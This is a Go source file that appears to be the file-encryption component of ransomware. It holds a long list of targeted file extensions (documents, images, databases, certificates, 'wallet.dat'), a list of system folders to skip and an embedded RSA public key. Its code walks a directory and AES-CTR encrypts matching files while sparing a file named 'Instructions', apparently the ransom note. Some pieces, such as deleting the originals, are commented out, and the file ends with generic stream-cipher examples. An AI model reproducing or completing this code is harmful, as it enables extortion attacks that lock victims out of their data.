package aes

import (
	"crypto/aes"
	"crypto/cipher"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

var plaintext []byte

var exts = []string{".mp4", ".avi", ".mp3", ".jpg", ".odt", ".mid", ".wma", ".flv",
	".mkv", ".mov", ".avi", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf",
	".wav", ".qcow2", ".vmx", ".gpg", ".aes", ".ARC", ".PAQ", ".tbk", ".bak", ".djv",
	".djvu", ".bmp", ".png", ".gif", ".raw", ".cgm", ".jpeg", ".jpg", ".tif",
	".tiff", ".NEF", ".psd", ".cmd", ".bat", ".class", ".java", ".asp", ".brd",
	".sch", ".dch", ".dip", ".vbs", ".asm", ".pas", ".cpp", ".php", ".ldf", ".mdf",
	".ibd", ".MYI", ".MYD", ".frm", ".odb", ".dbf", ".mdb", ".sql", ".SQLITEDB",
	".SQLITE3", ".asc", ".lay6", ".lay", ".ms11", ".sldm", ".sldx", ".ppsm",
	".ppsx", ".ppam", ".docb", ".mml", ".sxm", ".otg", ".odg", ".uop", ".potx",
	".potm", ".pptx", ".pptm", ".std", ".sxd", ".pot", ".pps", ".sti", ".sxi",
	".otp", ".odp", ".wks", ".xltx", ".xltm", ".xlsx", ".xlsm", ".xlsb", ".slk",
	".xlw", ".xlt", ".xlm", ".xlc", ".dif", ".stc", ".sxc", ".ots", ".ods", ".hwp",
	".dotm", ".dotx", ".docm", ".docx", ".DOT", ".max", ".xml", ".txt", ".CSV",
	".uot", ".RTF", ".pdf", ".XLS", ".PPT", ".stw", ".sxw", ".ott", ".odt",
	".DOC", ".pem", ".csr", ".crt", ".key", "wallet.dat",
}
var badfolders = []string{"tmp", "winnt", "Application Data", "AppData",
	"Program Files (x86)", "Program Files", "temp", "thumbs.db", "Recycle.Bin",
	"System Volume Information", "Boot", "Windows",
}

var block cipher.Block
var iv [aes.BlockSize]byte
var stream cipher.Stream
var targetFileName string
var key []byte

// Ext is the encrypted appended extension
var Ext = ".enc"

var pubKey = `-----BEGIN PUBLIC KEY-----
MIGgMA0GCSqGSIb3DQEBAQUAA4GOADCBigKBgQDQIHdNPClJAZVUb9AiPk/A7dAP
V2+6HLiw1pZyEZel+Pr0Z53uakh0BD1mNzZzfCr3AyCGqhxveyg5SItX8Ce8DQhN
Kl9TBjPjNjAKb4XF2kKZepMjOM2sgLsdAotYAZcUiczssmgxkHaUpoYtTs6YJadE
ypklH1uu6oM6xiVK/wIEDhO6Xw==
-----END PUBLIC KEY-----`

// EncryptDocumets Walks documments in a path and encript or decrypts them.
func EncryptDocumets(path string, mode bool) {
	if mode {
		//Encrypt
		filepath.Walk(path, visit)
	} else {
		//Decrpy
		filepath.Walk(path, visitD)
	}

}

// InitializeBlock Sets up the encription with a key
func InitializeBlock(myKey []byte, myIv []byte, tfn string) {
	key = myKey
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	/*for index, b := range myIv {

		iv[index] = b

	}*/
	stream = cipher.NewCTR(block, iv[:])
	targetFileName = tfn
}

func visit(path string, f os.FileInfo, err error) error {
	for _, folder := range badfolders {
		if strings.Contains(path, folder) {
			return nil
		}
	}
	if !strings.Contains(path, Ext) && !strings.Contains(path, "Instructions") && !strings.Contains(path, targetFileName) {
		for _, ext := range exts {
			if strings.Contains(path, ext) {
				StreamEncrypter(path)
				return nil
			}

		}
	}
	return nil
}
func visitD(path string, f os.FileInfo, err error) error {
	if strings.Contains(path, Ext) && !f.IsDir() {
		StreamDecrypter(path)
	}
	return nil
}

// StreamDecrypter decryps a file given its filepath
func StreamDecrypter(path string) (err error) {
	inFile, err := os.Open(path)
	if err != nil {
		//Couldn't open file, maybe a folder
		return
	}

	outFile, err := os.OpenFile(filenameDeobfuscator(path+"d"), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
	if err != nil {
		return
	}
	defer outFile.Close()
	reader := &cipher.StreamReader{S: stream, R: inFile}
	if _, err = io.Copy(outFile, reader); err != nil {
		panic(err)
	}
	inFile.Close()

	//os.Remove(path)
	return
}

// StreamEncrypter encrypts a file given its filepatth
func StreamEncrypter(path string) (err error) {
	inFile, err := os.Open(path)
	if err != nil {
		return
	}
	outFile, err := os.OpenFile(filenameObfuscator(path+"e"), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0777)
	if err != nil {
		return
	}

	writer := &cipher.StreamWriter{S: stream, W: outFile}

	if _, err = io.Copy(writer, inFile); err != nil {
		panic(err)
	}
	inFile.Close()
	outFile.Close()
	//os.Remove(path)
	return nil
}

func filenameObfuscator(path string) string {
	/*filenameArr := strings.Split(path, string(os.PathSeparator))
	filename := filenameArr[len(filenameArr)-1]
	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))

	return path2 + string(os.PathSeparator) + base64.Base64Encode(filename) + Ext*/
	return path

}
func filenameDeobfuscator(path string) string {
	/*//get the path for the output
	opPath := strings.Trim(path, Ext)
	// Divide filepath
	filenameArr := strings.Split(opPath, string(os.PathSeparator))
	//Get base64 encoded filename
	filename := filenameArr[len(filenameArr)-1]
	// get parent dir
	path2 := strings.Join(filenameArr[:len(filenameArr)-1], string(os.PathSeparator))
	return path2 + string(os.PathSeparator) + base64.Base64Decode(filename)*/
	return path
}

//////////////////// EXAMPLES

func ExampleStreamReader() {
	key := []byte("example key 1234")

	inFile, err := os.Open("encrypted-file")
	if err != nil {
		panic(err)
	}
	defer inFile.Close()

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// If the key is unique for each ciphertext, then it's ok to use a zero
	// IV.
	var iv [aes.BlockSize]byte
	stream := cipher.NewCTR(block, iv[:])

	outFile, err := os.OpenFile("decrypted-file2", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		panic(err)
	}
	defer outFile.Close()

	reader := &cipher.StreamReader{S: stream, R: inFile}
	// Copy the input file to the output file, decrypting as we go.
	if _, err := io.Copy(outFile, reader); err != nil {
		panic(err)
	}

	// Note that this example is simplistic in that it omits any
	// authentication of the encrypted data. If you were actually to use
	// StreamReader in this manner, an attacker could flip arbitrary bits in
	// the output.
}

func ExampleStreamWriter() {
	input1 := []byte("ooooooooooooooooooooo")
	tempDir, _ := filepath.Abs(filepath.Dir(os.Args[0]))
	// Write some files
	err := ioutil.WriteFile(tempDir+"/plaintext-file", input1, 0777)

	key := []byte("example key 1234")

	inFile, err := os.Open("plaintext-file")
	if err != nil {
		panic(err)
	}
	defer inFile.Close()

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// If the key is unique for each ciphertext, then it's ok to use a zero
	// IV.
	var iv [aes.BlockSize]byte
	stream := cipher.NewCTR(block, iv[:])

	outFile, err := os.OpenFile("encrypted-file", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		panic(err)
	}
	defer outFile.Close()

	writer := &cipher.StreamWriter{S: stream, W: outFile}
	// Copy the input file to the output file, encrypting as we go.
	if _, err := io.Copy(writer, inFile); err != nil {
		panic(err)
	}

	// Note that this example is simplistic in that it omits any
	// authentication of the encrypted data. If you were actually to use
	// StreamReader in this manner, an attacker could flip arbitrary bits in
	// the decrypted result.
}
